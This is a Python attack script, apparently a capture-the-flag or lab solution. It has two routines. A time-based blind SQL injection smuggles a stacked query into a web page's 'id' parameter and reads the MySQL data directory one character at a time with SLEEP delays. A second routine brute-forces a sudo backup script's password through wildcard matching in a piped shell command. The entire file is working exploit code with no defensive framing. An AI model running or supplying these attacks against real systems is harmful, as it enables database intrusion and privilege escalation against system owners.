#!/usr/bin/env python3
import argparse
import requests
import time
import urllib.parse
import string
import subprocess

def sql_injection_attack(base_url):
    word = ""
    position = 1
    found = False
    delay = 2

    while not found:
        for ascii_value in range(33, 123):
            char = chr(ascii_value)
            start_time = time.time()

            subquery = '(SELECT Variable_Value FROM information_schema.GLOBAL_VARIABLES WHERE Variable_Name = "datadir")'
            payload = urllib.parse.quote(f"';SELECT IF(MID({subquery},{position},1) = '{char}', SLEEP({delay}), 0) #1")

            response = requests.get(f"{base_url}?page=product&id=1%0A{payload}")
            elapsed_time = time.time() - start_time

            if elapsed_time > delay - 1:
                word += char
                print(f"\r{word}", end='', flush=True)
                break
        else:
            found = True

        position += 1

    print(word)

def command_injection_attack(backup_script):
    def check_password(p):
        command = f"echo '{p}*' | sudo {backup_script}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return "Password confirmed!" in result.stdout

    charset = string.ascii_letters + string.digits
    password = ""
    is_password_found = False

    while not is_password_found:
        for char in charset:
            if check_password(password + char):
                password += char
                print(password)
                break
        else:
            is_password_found = True

def main():
    parser = argparse.ArgumentParser(description="Execute an SQL or CMD injection attack.")
    parser.add_argument("type", choices=["sql", "cmd"], help="Type of attack: sql or cmd")
    parser.add_argument("script_path", help="URL for SQL injection or path to the script for CMD injection attack")
    args = parser.parse_args()

    if args.type == "sql":
        sql_injection_attack(args.script_path)
    elif args.type == "cmd":
        command_injection_attack(args.script_path)

if __name__ == "__main__":
    main()
